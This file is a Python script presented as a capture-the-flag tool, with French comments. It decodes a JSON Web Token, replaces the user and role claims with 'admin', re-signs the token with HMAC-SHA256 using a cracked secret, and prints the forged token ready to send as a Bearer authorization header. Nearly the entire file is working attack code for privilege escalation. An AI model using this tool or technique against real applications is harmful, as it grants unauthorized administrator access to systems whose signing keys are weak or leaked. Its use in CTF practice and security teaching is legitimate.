#!/usr/bin/env python3
"""
JWT Forger - CTF Tool
Décode un JWT, modifie le payload, re-signe avec le secret cracké.
Usage: python3 forge_jwt.py
"""

import base64
import hmac
import hashlib
import json
import sys

# ──────────────────────────────────────────────
# CONFIG — modifie ces valeurs selon ton challenge
# ──────────────────────────────────────────────
ORIGINAL_JWT = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
    ".eyJ1c2VyIjoibGFuZHJ5Iiwicm9sZSI6InVzZXIifQ"
    ".n_1CNLtQBDRXKsjtsgVYF9R1I9tt57WTV6M3PC5kjII"
)
SECRET = "tareq"
NEW_USER = "admin"
# ──────────────────────────────────────────────


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] JWT invalide (pas 3 parties)")
        sys.exit(1)
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_jwt(header: dict, payload: dict, secret: str) -> str:
    h = b64url_encode(json.dumps(header,  separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def main():
    print("=" * 60)
    print("         JWT FORGER — CTF Tool")
    print("=" * 60)

    # ── Décodage JWT original ──
    print(f"\n[*] JWT original:\n    {ORIGINAL_JWT}\n")
    header, payload, orig_sig = decode_jwt(ORIGINAL_JWT)

    print(f"[+] Header  : {json.dumps(header,  indent=2)}")
    print(f"[+] Payload : {json.dumps(payload, indent=2)}")
    print(f"[+] Secret  : {SECRET}")

    # ── Modification du payload ──
    # Cherche le champ user/username/name/sub et met admin
    modified = payload.copy()
    changed = False
    for key in ["user", "username", "name", "sub", "login"]:
        if key in modified:
            print(f"\n[*] Champ trouvé : '{key}' = '{modified[key]}' → '{NEW_USER}'")
            modified[key] = NEW_USER
            changed = True

    # Force aussi le rôle si présent
    for key in ["role", "roles", "is_admin", "admin"]:
        if key in modified:
            old = modified[key]
            if isinstance(old, bool):
                modified[key] = True
            elif isinstance(old, list):
                modified[key] = ["admin"]
            else:
                modified[key] = "admin"
            print(f"[*] Champ rôle  : '{key}' = '{old}' → '{modified[key]}'")
            changed = True

    if not changed:
        print("[!] Aucun champ user/role détecté — payload modifié manuellement.")
        modified["user"] = NEW_USER

    print(f"\n[+] Nouveau payload : {json.dumps(modified, indent=2)}")

    # ── Forge ──
    forged = forge_jwt(header, modified, SECRET)
    print("\n" + "=" * 60)
    print("[✓] JWT FORGÉ :")
    print(f"\n    {forged}\n")
    print("=" * 60)

    # ── Vérification rapide ──
    h2, p2, _ = decode_jwt(forged)
    print(f"[✓] Vérification décodage : {json.dumps(p2)}")
    print("\n[>] Utilise ce token dans le header HTTP :")
    print(f"    Authorization: Bearer {forged}")


if __name__ == "__main__":
    main()
